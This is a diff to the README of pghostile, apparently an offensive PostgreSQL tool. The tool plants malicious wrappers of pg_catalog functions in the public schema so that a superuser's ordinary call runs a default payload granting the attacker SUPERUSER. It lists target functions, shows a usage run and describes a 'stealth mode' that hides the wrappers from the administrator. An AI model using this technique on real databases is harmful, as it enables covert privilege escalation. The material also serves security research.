@@ -10,7 +10,7 @@ Considering that an unprivileged user can create functions in the public schema 
 
 In a few words, pghostile searches pg_catalog for functions that can be overridden and creates a malicious wrapper of them in the public schema.  
 
-Currently, it can identify ~500 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
+Currently, it can identify ~650 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
 ```SQL
 select sha256('randstr');
 select unnest(array [1, 2]);
@@ -30,6 +30,7 @@ select hashmacaddr('01:01:01:02:02:02');
 select hashinet('10.0.0.1');
 select xml_out('<foo />');
 select json_out('[true]');
+select uuid_out('93967025-8c89-4320-ad51-4ef50694502f');
 ```
 
 Then, if the superuser runs something like `select sha256('test123')` you will be superuser in no time ;)
@@ -66,6 +67,7 @@ With the -T option you can disable the tests and just create the exploit functio
 The -x option allows you to specify what SQL command(s) should be used in your exploit. By default it's ```ALTER USER <db_username> WITH SUPERUSER;```.  
 The -s option disables the "stealth mode". In stealth mode the wrapping functions will call the original function from pg_catalog, in this way the superuser won't see any anomaly when calling a wrapped function. There are also less chances to break execution flows that could bring us to other vulnerable points.  
 The -t option enables the tracking of the execution of the exploit functions. It means that every successfull call of an exploit function is logged into a table of the current DB (pghostile.triggers). It's useful for extension analisys.  
+The -p option forces the DB's password request even if the PGPASSWORD environment variable is set.  
 
 ### Example
 ```
@@ -74,14 +76,14 @@ pghostile.py user1 testdb -H 10.211.55.12
 ```
 Starting ... 
 
-[ * ] 762 interesting functions have been identified
+[ * ] 1272 interesting functions have been identified
 [ * ] Creating test functions
 [ * ] Testing functions
 [ * ] Deleting test functions
 [ * ] Creating exploit functions
-[ * ] Done! 594 functions have been created
+[ * ] Done! 913 functions have been created
 
-433 exploitable functions and params combinations have been tested!
+663 exploitable functions and params combinations have been tested!
 The './out' folder contains the output
 ```
 
